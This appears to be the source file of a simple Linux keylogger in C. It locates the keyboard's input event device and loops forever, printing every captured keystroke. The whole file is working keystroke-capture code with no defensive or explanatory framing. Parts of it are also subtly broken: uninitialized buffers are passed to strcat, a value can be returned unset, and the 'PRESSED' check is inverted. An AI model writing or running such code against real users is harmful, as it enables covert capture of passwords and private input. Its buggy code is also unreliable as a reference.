
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
//#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include "keylogger.h"
char get_event_num(){

    const char *key_word = "keyboard";
    const char *event_word= "event";
    const int event_len = strlen(event_word);
    char num_event;
    char *t_temp;

    FILE* fp;
    char buffer_line[BUFF_LINE];
    char buffer_chunk[BUFF_CHUNK]="";

    fp = fopen(GET_EVENT_PATH, "rb");
    
    if (fp == NULL)
        return -1;

while(fgets(buffer_line, BUFF_LINE, fp)) {
    if(buffer_line[0] == '\0' || buffer_line[0]== '\n'){

        if (strstr(buffer_chunk, key_word) != NULL) {
            if(strstr(buffer_chunk,event_word) !=NULL){
                t_temp= strstr(buffer_chunk, event_word);
                num_event = buffer_chunk[(int)(t_temp - buffer_chunk) + event_len ];
                }
        
        }

        memset(buffer_chunk,0,strlen(buffer_chunk));
        }
        

    strcat(buffer_chunk, buffer_line);
    }

    fclose(fp);

    return num_event;

}

int capture_keys(char *event_num){
    

    char event_final_path[BUFF_LINE];
    struct input_event ev;
    char buffer[BUFF_LINE];
    int fd;

    strcat(event_final_path, EVENT_PATH);
    strcat(event_final_path, event_num);
    
    fd = open(event_final_path,O_RDONLY);
    
    if(fd == -1){
        fprintf(stderr, "error while opening the file %d", fd);
        return -1;
    }

    
    while(1){
        read(fd, &ev, sizeof(struct input_event));
        if(ev.type == 1){
            if(ev.value != 1){ // PRESSED
                printf("key pressed: %s \n", keycodes[ev.code]);
                //strcat(buffer, keycodes[ev.code]);

                if(strlen(buffer) == BUFF_LINE-1){
                    printf("needs to clean buffer!");
                    memset(buffer,0,BUFF_LINE);
    
                }
            }

        }
    }
    return 0;
}
